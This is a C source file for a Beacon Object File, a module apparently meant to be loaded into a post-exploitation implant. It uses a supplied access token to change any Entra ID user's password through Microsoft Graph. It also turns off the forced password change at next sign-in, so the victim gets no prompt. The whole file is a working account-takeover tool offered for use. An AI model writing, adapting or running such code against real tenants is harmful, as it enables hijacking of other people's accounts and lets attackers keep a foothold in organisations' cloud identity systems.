/*
 * set_entra_user_password.c — BARK BOF
 * Set-EntraUserPassword — Set an Entra user's password
 *
 * Args : token, targetUserId, newPassword
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[512], bodyBuf[1024];
    LPWSTR widePath = NULL;
    char  *token = NULL, *targetUserId = NULL, *newPassword = NULL;

    BeaconDataParse(&parser, args, alen);
    token        = BeaconDataExtract(&parser, NULL);
    targetUserId = BeaconDataExtract(&parser, NULL);
    newPassword  = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_set_entra_user_password <token> <userId> <newPassword>\n");
        return;
    }

    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"passwordProfile\":{\"forceChangePasswordNextSignIn\":false,\"password\":\"%s\"}}",
        newPassword);

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/v1.0/users/%s", targetUserId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Set-EntraUserPassword for user %s\n", targetUserId);
    BarkPost(L"graph.microsoft.com", widePath, L"PATCH", bodyBuf, token, "application/json");
    HFree(widePath);
}
